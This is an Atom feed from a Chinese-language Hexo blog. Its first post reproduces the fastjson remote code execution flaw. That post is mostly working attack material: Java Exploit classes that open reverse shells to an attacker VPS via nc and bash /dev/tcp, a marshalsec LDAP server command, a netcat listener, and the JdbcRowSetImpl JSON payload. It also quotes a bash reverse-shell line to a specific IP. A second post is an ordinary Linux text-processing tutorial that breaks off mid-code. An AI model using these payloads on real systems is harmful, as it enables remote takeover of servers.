<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SivensHome</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-28T16:35:53.727Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fastjson远程代码执行漏洞复现</title>
    <link href="http://yoursite.com/2019/10/29/fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/29/fastjson远程代码执行漏洞复现/</id>
    <published>2019-10-28T16:00:32.000Z</published>
    <updated>2019-10-28T16:35:53.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>目标机：Windows7<br>Java版本号：1.8.0_131<br>攻击机器：阿里云</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1，由于使用的是Windows的机器，所以为了方便先在目标机器上安装了netcat：下载地址：<a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat/</a><br>（下载1.1.12版本即可）</p><p>2，在目标机器中安装fastjson的复现环境，只需要在Tomcat当中部署相关poc项目即可。</p><p>3，漏洞利用：</p><p>将下面的exp编译好后，使用python构建轻型服务：python -m SimpleHTTPServer port</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">"nc -e cmd.exe vpsip port"</span>);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后云服务器开启服务：服务器使用marshalsec开启ldap服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip（云服务器IP）:port（开启服务供目标机下载payload的端口号）<span class="comment">#Exploit  port</span></span><br></pre></td></tr></table></figure><p>最后云服务器开启nc监听:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nc -lvvp port（这个端口号和payload中的端口号相同）</span><br></pre></td></tr></table></figure><p>以上步骤准备就绪后，就可以针对漏洞点进行测试了:</p><p>假如相关接口，使用了fastjson并且版本号小于或者等于1.2.47，即可触发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: &#123;</span><br><span class="line">    <span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>,</span><br><span class="line">    <span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"x"</span>: &#123;</span><br><span class="line">    <span class="string">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">    <span class="string">"dataSourceName"</span>: <span class="string">"ldap://vpsip:port(Python HTTPserver下载端口)/Exploit"</span>,</span><br><span class="line">    <span class="string">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上步骤正确即可实现在Windows机器上反弹shell到云端服务器，从而控实现控制目标机器：</p><h2 id="Linux系统反弹shell注意事项："><a href="#Linux系统反弹shell注意事项：" class="headerlink" title="Linux系统反弹shell注意事项："></a>Linux系统反弹shell注意事项：</h2><p>在其他帖子当中看到，Linux系统反弹shell，不能直接使用bash -i &gt;&amp; /dev/tcp/119.28.130.53/18888 0&gt;&amp;1 类似这种，下面的这种方式应该可行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反弹shell_Exp:</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().<span class="built_in">exec</span>(new String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.124.5/888;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外JDK版本也是需要注意的地方，有的JDK版本的ldap服务默认是关闭的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;目标机：Windows7&lt;br&gt;Java版本号：1.8.0_131&lt;br&gt;攻击机器：阿里云&lt;/p&gt;
&lt;h2 id=&quot;复现步骤
      
    
    </summary>
    
    
      <category term="远程代码执行漏洞分类" scheme="http://yoursite.com/categories/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux文本处理命令行用法</title>
    <link href="http://yoursite.com/2019/10/27/Linuxpost/"/>
    <id>http://yoursite.com/2019/10/27/Linuxpost/</id>
    <published>2019-10-27T03:16:50.000Z</published>
    <updated>2019-10-27T16:37:19.722Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍Linux下使用Shell处理文本时最常用的工具：</p><p>find、grep、xargs、sort、uniq、tr、cut、paste、wc、sed、awk；</p><p>提供的例子和参数都是最常用和最为实用的；</p><p>对shell脚本使用的原则是命令单行书写，尽量不要超过2行；</p><p>如果有更为复杂的任务需求，还是考虑python吧；</p><p>##01 find 文件查找<br>###1 查找txt和pdf文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . ( -name <span class="string">"*.txt"</span>-o -name  <span class="string">"*.pdf"</span>) -<span class="built_in">print</span> (实际使用中不适用括号)</span><br></pre></td></tr></table></figure><p>###2 正则方式查找.txt和pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . -regex  <span class="string">".*(.txt|.pdf)$"</span></span><br></pre></td></tr></table></figure><p>-iregex：忽略大小写的正则</p><p>###3 否定参数</p><p>查找所有非txt文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . ! -name <span class="string">"*.txt"</span> -<span class="built_in">print</span></span><br></pre></td></tr></table></figure><p>###4 指定搜索深度</p><p>打印出当前目录的文件（深度为1）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . -maxdepth 1 -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure><p>###5 定制搜索</p><p>按类型搜索：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> d -<span class="built_in">print</span>  //只列出所有目录 -<span class="built_in">type</span> f 文件 / l 符号链接</span><br></pre></td></tr></table></figure><p>按时间搜索：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-atime 访问时间 (单位是天，分钟单位则是-amin，以下类似）</span><br><span class="line"></span><br><span class="line">-mtime 修改时间 （内容被修改）</span><br><span class="line"></span><br><span class="line">-ctime 变化时间 （元数据或权限变化）</span><br></pre></td></tr></table></figure><p>最近7天被访问过的所有文件：</p><p>find . -atime 7 -type f -print</p><p>按大小搜索：w字 k M G</p><p>寻找大于2k的文件 find . -type f -size + 2k</p><p>按权限查找：find . -type f -perm  644 -print //找具有可执行权限的所有文件</p><p>按用户查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -user weber -<span class="built_in">print</span>// 找用户weber所拥有的文件</span><br></pre></td></tr></table></figure><p>6 找到后的后续动作</p><p>删除：</p><p>删除当前目录下所有的swp文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -name <span class="string">"*.swp"</span> -delete</span><br></pre></td></tr></table></figure><p>执行动作（强大的exec）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -user root -<span class="built_in">exec</span> chown weber &#123;&#125; ; //将当前目录下的所有权变更为weber</span><br><span class="line"></span><br><span class="line">注：&#123;&#125;是一个特殊的字符串，对于每一个匹配的文件，&#123;&#125;会被替换成相应的文件名；</span><br></pre></td></tr></table></figure><p>eg：将找到的文件全都copy到另一个目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -mtime + 10 -name <span class="string">"*.txt"</span> -<span class="built_in">exec</span> cp &#123;&#125; OLD ;</span><br></pre></td></tr></table></figure><p>7 结合多个命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tips: 如果需要后续执行多个命令，可以将多个命令写成一个脚本。然后 -<span class="built_in">exec</span> 调用时执行脚本即可；</span><br><span class="line"></span><br><span class="line">-<span class="built_in">exec</span> ./commands.sh &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">-<span class="built_in">print</span>的定界符</span><br><span class="line"></span><br><span class="line">默认使用<span class="string">' '</span>作为文件的定界符；</span><br><span class="line"></span><br><span class="line">-print0 使用<span class="string">''</span>作为文件的定界符，这样就可以搜索包含空格的文件；</span><br></pre></td></tr></table></figure><p>##02 grep 文本搜索<br>grep match_patten file // 默认访问匹配行</p><p>常用参数:</p><p>-o 只输出匹配的文本行 VS -v 只输出没有匹配的文本行</p><p>-c 统计文件中包含文本的次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep -c <span class="string">"text"</span> filename</span><br><span class="line"></span><br><span class="line">-n 打印匹配的行号</span><br><span class="line"></span><br><span class="line">-i 搜索时忽略大小写</span><br><span class="line"></span><br><span class="line">-l 只打印文件名</span><br><span class="line"></span><br><span class="line">1 在多级目录中对文本递归搜索(程序员搜代码的最爱）：</span><br><span class="line"></span><br><span class="line">grep <span class="string">"class"</span> . -R -n</span><br></pre></td></tr></table></figure><p>2 匹配多个模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e <span class="string">"class"</span> -e <span class="string">"vitural"</span> file</span><br></pre></td></tr></table></figure><p>3 grep输出以作为结尾符的文件名：（-z）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">"test"</span> file* -lZ| xargs -0 rm</span><br></pre></td></tr></table></figure><p>4 xargs 命令行参数转换</p><p>xargs 能够将输入数据转化为特定命令的命令行参数；这样，可以配合很多命令来组合使用。比如grep，比如find；</p><p>将多行输出转化为单行输出</p><p>cat file.txt| xargs</p><p>是多行文本间的定界符</p><p>将单行转化为多行输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat single.txt | xargs -n 3</span><br><span class="line"></span><br><span class="line">-n：指定每行显示的字段数</span><br><span class="line"></span><br><span class="line">xargs参数说明</span><br><span class="line"></span><br><span class="line">-d 定义定界符 （默认为空格 多行的定界符为 ）</span><br><span class="line"></span><br><span class="line">-n 指定输出为多行</span><br><span class="line"></span><br><span class="line">-I &#123;&#125; 指定替换字符串，这个字符串在xargs扩展时会被替换掉,用于待执行的命令需要多个参数时</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line"></span><br><span class="line">cat file.txt | xargs -I &#123;&#125; ./command.sh -p &#123;&#125; -</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">-0：指定为输入定界符</span><br></pre></td></tr></table></figure><p>eg：统计程序行数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find source_dir/ -<span class="built_in">type</span> f -name <span class="string">"*.cpp"</span> -print0 |xargs -0 wc -l</span><br></pre></td></tr></table></figure><p>##03 sort 排序<br>字段说明：</p><p>-n 按数字进行排序 VS -d 按字典序进行排序</p><p>-r 逆序排序</p><p>-k N 指定按第N列排序</p><p>eg：<br>sort -nrk 1 data.txt<br>sort -bd data // 忽略像空格之类的前导空白字符</p><p>###04 uniq 消除重复行<br>消除重复行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort unsort.txt | uniq</span><br></pre></td></tr></table></figure><p>统计各行在文件中出现的次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort unsort.txt | uniq -c</span><br></pre></td></tr></table></figure><p>找出重复行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort unsort.txt | uniq -d</span><br></pre></td></tr></table></figure><p>可指定每行中需要比较的重复内容：-s 开始位置 -w 比较字符数</p><p>###05 用 tr 进行转换<br>通用用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 12345 | tr <span class="string">'0-9'</span> <span class="string">'9876543210'</span></span><br><span class="line">//加解密转换，替换对应字符</span><br></pre></td></tr></table></figure><p>cat text| tr ‘    ‘ ‘ ‘<br>//制表符转空格</p><p>tr删除字符</p><p>cat file | tr -d ‘0-9’<br>// 删除所有数字</p><p>-c 求补集</p><p>cat file | tr -c ‘0-9’<br>//获取文件中所有数字</p><p>cat file | tr -d -c ‘0-9 ‘<br>//删除非数字数据</p><p>tr压缩字符</p><p>tr -s 压缩文本中出现的重复字符；最常用于压缩多余的空格</p><p>cat file | tr -s ‘ ‘</p><p>字符类</p><p>tr中可用各种字符类：</p><p>alnum：字母和数字</p><p>alpha：字母</p><p>digit：数字</p><p>space：空白字符</p><p>lower：小写</p><p>upper：大写</p><p>cntrl：控制（非可打印）字符</p><p>print：可打印字符</p><p>使用方法：tr [:class:] [:class:]</p><p>eg: tr ‘[:lower:]’ ‘[:upper:]’</p><p>##06 cut 按列切分文本<br>截取文件的第2列和第4列：</p><p>cut -f2,4 filename</p><p>去文件除第3列的所有列：</p><p>cut -f3 –complement filename</p><p>-d 指定定界符：</p><p>cat -f2 -d”;” filename</p><p>cut 取的范围</p><p>N- 第N个字段到结尾</p><p>-M 第1个字段为M</p><p>N-M N到M个字段</p><p>cut 取的单位</p><p>-b 以字节为单位</p><p>-c 以字符为单位</p><p>-f 以字段为单位（使用定界符）</p><p>eg:</p><p>cut -c1-5 file //打印第一到5个字符</p><p>cut -c-2 file  //打印前2个字符</p><p>##07 paste 按列拼接文本<br>将两个文本按列拼接到一起;</p><p>cat file1<br>1<br>2</p><p>cat file2<br>colin<br>book</p><p>paste file1 file2<br>1 colin<br>2 book</p><p>默认的定界符是制表符，可以用-d指明定界符</p><p>paste file1 file2 -d “,”<br>1,colin<br>2,book</p><p>##08 wc 统计行和字符的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wc -l file // 统计行数</span><br><span class="line"></span><br><span class="line">wc -w file // 统计单词数</span><br><span class="line"></span><br><span class="line">wc -c file // 统计字符数</span><br></pre></td></tr></table></figure><p>##09 sed 文本替换利器<br>首处替换</p><p>seg ‘s/text/replace_text/‘ file   //替换每一行的第一处匹配的text</p><p>全局替换</p><p>seg ‘s/text/replace_text/g’ file</p><p>默认替换后，输出替换后的内容，如果需要直接替换原文件,使用-i：</p><p>seg -i ‘s/text/repalce_text/g’ file</p><p>移除空白行：</p><p>sed ‘/^$/d’ file</p><p>变量转换</p><p>已匹配的字符串通过标记&amp;来引用.</p><p>echo this is en example | seg ‘s/w+/[&amp;]/g’</p><p>$&gt;[this]  [is] [en] [example]</p><p>子串匹配标记</p><p>第一个匹配的括号内容使用标记 来引用</p><p>sed ‘s/hello([0-9])//‘</p><p>双引号求值</p><p>sed通常用单引号来引用；也可使用双引号，使用双引号后，双引号会对表达式求值：</p><p>sed ‘s/$var/HLLOE/‘</p><p>当使用双引号时，我们可以在sed样式和替换字符串中指定变量；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line"></span><br><span class="line">p=patten</span><br><span class="line"></span><br><span class="line">r=replaced</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"line con a patten"</span>| sed <span class="string">"s/<span class="variable">$p</span>/<span class="variable">$r</span>/g"</span></span><br><span class="line"></span><br><span class="line">$&gt;line con a replaced</span><br><span class="line"></span><br><span class="line">其它示例</span><br><span class="line"></span><br><span class="line">字符串插入字符：将文本中每行内容（PEKSHA） 转换为 PEK/SHA</span><br><span class="line"></span><br><span class="line">sed <span class="string">'s/^.&#123;3&#125;/&amp;//g'</span> file</span><br></pre></td></tr></table></figure><p>##10 awk 数据流处理工具<br>###awk脚本结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">' BEGIN&#123; statements &#125; statements2 END&#123; statements &#125; '</span></span><br></pre></td></tr></table></figure><p>工作方式</p><p>1.执行begin中语句块；</p><p>2.从文件或stdin中读入一行，然后执行statements2，重复这个过程，直到文件全部被读取完毕；</p><p>3.执行end语句块；</p><p>print 打印当前行</p><p>使用不带参数的print时，会打印当前行;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"line1 line2"</span>| awk <span class="string">'BEGIN&#123;print "start"&#125; &#123;print &#125; END&#123; print "End" &#125;'</span></span><br></pre></td></tr></table></figure><p>print 以逗号分割时，参数以空格定界;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> | awk <span class="string">' &#123;var1 = "v1" ; var2 = "V2"; var3="v3";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print var1, var2 , var3; &#125;'</span></span><br><span class="line"></span><br><span class="line">$&gt;v1 V2 v3</span><br></pre></td></tr></table></figure><p>使用-拼接符的方式（””作为拼接符）;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> | awk <span class="string">' &#123;var1 = "v1" ; var2 = "V2"; var3="v3";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print var1"-"var2"-"var3; &#125;'</span></span><br><span class="line"></span><br><span class="line">$&gt;v1-V2-v3</span><br></pre></td></tr></table></figure><p>特殊变量：NR NF $0 $1 $2</p><p>NR:表示记录数量，在执行过程中对应当前行号；</p><p>NF:表示字段数量，在执行过程总对应当前行的字段数；</p><p>$0:这个变量包含执行过程中当前行的文本内容；</p><p>$1:第一个字段的文本内容；</p><p>$2:第二个字段的文本内容；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"line1 f2 f3 line2 line 3"</span>| awk <span class="string">'&#123;print NR":"$0"-"$1"-"$2&#125;'</span></span><br></pre></td></tr></table></figure><p>打印每一行的第二和第三个字段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'&#123;print $2, $3&#125;'</span> file</span><br></pre></td></tr></table></figure><p>统计文件的行数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">' END &#123;print NR&#125;'</span> file</span><br></pre></td></tr></table></figure><p>累加每一行的第一个字段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"1 2 3 4 "</span>| awk <span class="string">'BEGIN&#123;num = 0 ;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print "begin";&#125; &#123;sum += $1;&#125; END &#123;print "=="; print sum &#125;'</span></span><br></pre></td></tr></table></figure><p>传递外部变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var=1000</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> | awk <span class="string">'&#123;print vara&#125;'</span> vara=<span class="variable">$var</span> </span><br><span class="line"><span class="comment">#  输入来自stdin</span></span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print vara&#125;'</span></span><br><span class="line"> vara=<span class="variable">$var</span> file </span><br><span class="line"> 输入来自文件</span><br></pre></td></tr></table></figure><p>用样式对awk处理的行进行过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'NR &lt; 5'</span></span><br><span class="line">行号小于5</span><br><span class="line"></span><br><span class="line">awk <span class="string">'NR==1,NR==4 &#123;print&#125;'</span> file </span><br><span class="line"><span class="comment">#行号等于1和4的打印出来</span></span><br><span class="line"></span><br><span class="line">awk <span class="string">'/linux/'</span></span><br><span class="line"><span class="comment">#包含linux文本的行（可以用正则表达式来指定，超级强大）</span></span><br><span 